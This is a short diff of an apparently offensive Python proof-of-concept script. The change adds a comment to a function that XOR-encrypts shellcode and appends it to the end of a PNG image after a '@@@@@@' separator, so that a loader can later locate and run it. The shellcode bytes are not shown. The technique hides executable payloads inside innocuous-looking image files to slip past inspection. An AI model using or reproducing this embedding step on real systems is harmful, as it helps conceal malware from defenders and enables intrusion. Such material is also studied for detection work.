@@ -23,7 +23,7 @@ def Write_Shellcode():
 
 
     xored_shellcode = bytearray(encrypted_bytes)
-    with open('PoC_load_shellcode.png', 'ab') as image_mod:
+    with open('PoC_load_shellcode.png', 'ab') as image_mod: #WE OPEN THE IMAGE AS BINARY AND WE WILL APPEND THE DATA AT THE END OF THE IMAGE
         image_mod.write(bytes('@@@@@@', 'latin-1')) #WE WRITE A SEPARATOR BETWEEN THE ORIGINAL IMAGE AND THE SHELLCODE. THIS WILL BE USED TO IDENTIFY THE START OF THE SHELLCODE
                                               #I HAVE USED @@@@, BUT YOU CAN USE WHAT YOU WANT
         image_mod.write(xored_shellcode)            #WE WRITE THE SHELLCODE TO THE IMAGEN
